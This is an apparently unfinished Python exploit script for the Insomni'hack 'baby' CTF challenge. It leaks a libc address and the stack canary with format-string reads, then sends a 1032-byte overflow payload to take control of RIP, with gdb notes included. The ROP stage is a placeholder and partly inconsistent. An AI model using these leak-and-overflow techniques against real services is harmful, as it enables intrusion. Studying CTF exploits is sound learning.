#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''

Strategy:
==========
1. Leak a libc address from the stack and calculate the libc base address
2. Leak the stack cookie
3. Trigger the buffer overflow and get RIP control
4. Do some rop magic

Tricks:
========
Rename to libc.so.6 and:
LD_LIBRARY_PATH=. ./baby


1)  Cookie stored at the beginning of the function at [rbp - 8]
 
Cookie breakpoint               https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
br *dofmt+17 
   0x7f379ee674d9 <dofmt+17>:   mov    rax,QWORD PTR fs:0x28         // copy canary pointer into RAX
=> 0x7f379ee674e2 <dofmt+26>:   mov    QWORD PTR [rbp-0x8],rax       // copy the canary content into RAX
   0x7f379ee674e6 <dofmt+30>:   xor    eax,eax                       // zero out the canary 

br *dofmt+135

        RAX: 0x83511eb77edda800 

br *dostack+160
   0x7fd9efbe14b2 <dostack+160>:    mov    rcx,QWORD PTR [rbp-0x8]
=> 0x7fd9efbe14b6 <dostack+164>:    xor    rcx,QWORD PTR fs:0x28
   0x7fd9efbe14bf <dostack+173>:    je     0x7fd9efbe14c6 <dostack+180>
   0x7fd9efbe14c1 <dostack+175>:    call   0x7fd9efbe0e30 <__stack_chk_fail@plt>
        
        RCX: 0xec3c87dd37f3f200 


2) Libc and system
> rabin2 -s libc.so.6 | grep system
vaddr=0x00045390 paddr=0x00045390 ord=584 fwd=NONE sz=45 bind=GLOBAL type=FUNC name=__libc_system

# verify cookie
br *dostack+160

set follow-fork-mode child
c

'''
from pwn import *
import re
import socket  
import sys  
import struct  
import telnetlib


def perror():
    sys.exit("python {0} remote/local".format(sys.argv[0]))

try:
    arg1 = str(sys.argv[1])
except:
    perror()


PORT = 1337
if (arg1 == "remote"):
    HOST = "baby.teaser.insomnihack.ch"
elif (arg1 == "local"):
    HOST = "127.0.0.1"
else:
    perror()


def interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def readuntil(s, delim='\n'):
    x = ""
    while not x.endswith(delim):
        x += s.recv(1)
    return x

def chain2string(rop):
    return "".join([struct.pack("<I", x) for x in rop])


def pause():
    print "[*] Paused, press ENTER to continue."
    raw_input()


def connect():
    # Connect to target
    # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # s.connect((HOST, PORT))
    # print("[*] Connecting to {0}:{1}".format(HOST,PORT))
    # return s
    
    s = remote(HOST, PORT)
    return s


def dofmt(s):
    choice="2"

    global libc, cookie

    s.readuntil("> ")
    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%158$llx")      
    libc_str = s.recvline()
    libc = int(libc_str,16)
    log.info("2.dofmt()=> Leaking <__libc_start_main+245> at: {:x}".format(libc))
    

    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%138$llx")
    recv = s.recv()
    cookie = (re.search(r"[0-9A-Fa-f]{16}", recv)).group(0)
    log.info("2.dofmt()=> Leaking stack cookie: {}".format(cookie))
    cookie = p64(int(cookie.strip(),16))
    
    pause()

    # Back to main menu
    s.sendline("")



def  dostack(s):
    choice = "1"
    system_off = 0x00045390
    libc
    RBP = "EEEEEEEE"
    RIP = "DDDDDDDD" #p64()

    log.info("1.dostack()=> ")
    
    # Generate payload
    buff = "A"* 1032 + cookie + RBP + RIP

    log.info("Payload : {}".format(buff))

    log.info("Sending choice {}".format(choice))
    s.sendline(choice)
    
    buffsz = str(len(buff))
    x = s.readuntil("bytes you want to send ? ")
    log.info(x)
    log.info("Sending buffsz {}".format(buffsz))
    s.sendline(buffsz)
    log.info("Sending buff {}".format(buff))
    s.sendline(buff)     
    s.interactive()


def rop(s):  
    try:
        log.info("Building ROP chain")
        # Build payload
        payload =  ""
        payload += struct.pack("<I", 0x76EE012C)

        # Send payload
        s.send(payload)
        
        # Interact with the shell
        #interact()
    except socket.errno:
        raise


def main():
    s = connect() 
    dofmt(s)       
    #p64(int(cookie,16))
    dostack(s)

    rop(s)
    


if __name__ == '__main__':  
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)